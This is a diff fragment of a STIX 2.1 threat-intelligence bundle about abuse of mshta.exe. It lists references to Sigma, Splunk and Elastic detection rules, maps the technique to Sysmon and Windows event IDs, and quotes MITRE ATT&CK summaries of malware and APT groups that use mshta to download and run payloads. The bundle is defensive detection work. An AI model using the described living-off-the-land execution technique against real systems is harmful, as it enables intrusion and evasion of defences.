+      "modified": "2023-08-20T18:02:03+01:00",
+      "sighting_of_ref": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116"
+      ]
+    },
+    {
+      "name": "(Sigma|Splunk|ELK)",
+      "description": "\"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml\",\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_execution.yml\",\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml\",\n        \"https://raw.githubusercontent.com/splunk/security_content/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml\",\n        \"https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/defense_evasion_mshta_beacon.toml\",\n        \"https://raw.githubusercontent.com/elastic/detection-rules/main/rules/_deprecated/defense_evasion_mshta_making_network_connections.toml\"",
+      "id": "course-of-action--9f4e599a-53c5-4dff-a8df-d52fb186e4f5",
+      "type": "course-of-action",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "external_references": [
+        {
+          "source_name": "Sigma",
+          "url": "https://github.com/SigmaHQ/sigma/tree/master/rules"
+        },
+        {
+          "source_name": "Splunk",
+          "url": "https://github.com/splunk/security_content"
+        },
+        {
+          "source_name": "Elastic",
+          "url": "https://github.com/elastic/detection-rules"
+        }
+      ]
+    },
+    {
+      "name": "(Sysmon|windowsEventId",
+      "description": "\"T1218:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1\",\n            \"T1218:file:file_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:11\",\n            \"T1218:network_traffic:network_connection_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3\",\n            \"T1218:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688\",\n            \"T1218:file:file access:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4663\",\n            \"T1218:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5156\",\n            \"T1218:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5157\"",
+      "id": "course-of-action--5e829da4-6f89-4ba1-99b5-3d8c4fa79b11",
+      "type": "course-of-action",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "external_references": [
+        {
+          "source_name": "OSSEM-DM",
+          "url": "https://github.com/OTRF/OSSEM-DM/blob/03404288803c743cd5254f8888d664a5a106ec89/use-cases/mitre_attack/techniques_to_events_mapping.yaml"
+        }
+      ]
+    },
+    {
+      "id": "grouping--48a1e44d-fe4e-42a4-b73b-678f8e545bd8",
+      "type": "grouping",
+      "spec_version": 2.1,
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "2023-09-05T23:23:32+01:00",
+      "name": "Associated Detections",
+      "description": "Associated Detections",
+      "context": "unspecified",
+      "object_refs": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+        "course-of-action--5e829da4-6f89-4ba1-99b5-3d8c4fa79b11",
+        "course-of-action--9f4e599a-53c5-4dff-a8df-d52fb186e4f5"
+      ]
+    },
+    {
+      "name": "Relationship Malware->Tools",
+      "description": "\"[BabyShark](https://attack.mitre.org/software/S0414) has used mshta.exe to download and execute applications from a remote server.(Citation: CISA AA20-301A Kimsuky)\",\n\"[Revenge RAT](https://attack.mitre.org/software/S0379) uses mshta.exe to run malicious scripts on the system.(Citation: Cofense RevengeRAT Feb 2019)\",\n\"[Metamorfo](https://attack.mitre.org/software/S0455) has used mshta.exe to execute a HTA payload.(Citation: FireEye Metamorfo Apr 2018) \",\n\"[Xbash](https://attack.mitre.org/software/S0341) can use mshta for executing scripts.(Citation: Unit42 Xbash Sept 2018)\",\n\"[NanHaiShu](https://attack.mitre.org/software/S0228) uses mshta.exe to load its program and files.(Citation: fsecure NanHaiShu July 2016)\",\n\"[Pteranodon](https://attack.mitre.org/software/S0147) can use mshta.exe to execute an HTA file hosted on a remote server.(Citation: Symantec Shuckworm January 2022)\",\n\"[POWERSTATS](https://attack.mitre.org/software/S0223) can use Mshta.exe to execute additional payloads on compromised hosts.(Citation: FireEye MuddyWater Mar 2018)\",\n\"[Sibot](https://attack.mitre.org/software/S0589) has been executed via MSHTA application.(Citation: MSTIC NOBELIUM Mar 2021)\",\n\"[Koadic](https://attack.mitre.org/software/S0250) can use mshta to serve additional payloads and to help schedule tasks for persistence.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021) \"",
+      "id": "sighting--93911ab3-7353-4b64-a32f-2a0a8d8ed2d3",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-09-20T18:02:03+01:00",
+      "modified": "2023-09-20T18:02:03+01:00",
+      "sighting_of_ref": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116"
+      ]
+    },
+    {
+      "name": "Relationship APTs->Tools",
+      "description": "\"[APT32](https://attack.mitre.org/groups/G0050) has used mshta.exe for code execution.(Citation: Cybereason Oceanlotus May 2017)(Citation: Cybereason Cobalt Kitty 2017)\",\n\"[Confucius](https://attack.mitre.org/groups/G0142) has used mshta.exe to execute malicious VBScript.(Citation: TrendMicro Confucius APT Feb 2018) \",\n\"[APT29](https://attack.mitre.org/groups/G0016) has use `mshta` to execute malicious scripts on a compromised host.(Citation: ESET T3 Threat Report 2021)\",\n\"[Gamaredon Group](https://attack.mitre.org/groups/G0047) has used `mshta.exe` to execute malicious HTA files.(Citation: Symantec Shuckworm January 2022)\",\n\"[Inception](https://attack.mitre.org/groups/G0100) has used malicious HTA files to drop and execute malware.(Citation: Kaspersky Cloud Atlas August 2019)\",\n\"[Lazarus Group](https://attack.mitre.org/groups/G0032) has used <code>mshta.exe</code> to execute HTML pages downloaded by initial access documents.(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus)\",\n\"[TA551](https://attack.mitre.org/groups/G0127) has used mshta.exe to execute malicious payloads.(Citation: Unit 42 TA551 Jan 2021)\",\n\"[Sidewinder](https://attack.mitre.org/groups/G0121) has used <code>mshta.exe</code> to execute malicious payloads.(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)\",\n\"[Mustang Panda](https://attack.mitre.org/groups/G0129) has used mshta.exe to launch collection scripts.(Citation: Secureworks BRONZE PRESIDENT December 2019)\",\n\"[FIN7](https://attack.mitre.org/groups/G0046) has used mshta.exe to execute VBScript to execute malicious code on victim systems.(Citation: FireEye FIN7 April 2017)\",\n\"[Kimsuky](https://attack.mitre.org/groups/G0094) has used mshta.exe to run malicious scripts on the system.(Citation: EST Kimsuky April 2019)(Citation: CISA AA20-301A Kimsuky)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: KISA Operation Muzabi)\",\n\"[MuddyWater](https://attack.mitre.org/groups/G0069) has used mshta.exe to execute its [POWERSTATS](https://attack.mitre.org/software/S0223) payload and to pass a PowerShell one-liner for execution.(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)\",\n\"[Earth Lusca](https://attack.mitre.org/groups/G1006) has used `mshta.exe` to load an HTA script within a malicious .LNK file.(Citation: TrendMicro EarthLusca 2022)\",\n\"[LazyScripter](https://attack.mitre.org/groups/G0140) has used `mshta.exe` to execute [Koadic](https://attack.mitre.org/software/S0250) stagers.(Citation: MalwareBytes LazyScripter Feb 2021) \",\n\"[SideCopy](https://attack.mitre.org/groups/G1008) has utilized `mshta.exe` to execute a malicious hta file.(Citation: MalwareBytes SideCopy Dec 2021)\"",
+      "id": "sighting--5e86faf8-b130-4be8-b30a-08c2eb1f82e3",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-09-20T18:02:03+01:00",
+      "modified": "2023-09-20T18:02:03+01:00",
+      "sighting_of_ref": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116"
+      ]
+    }
+  ]
+}
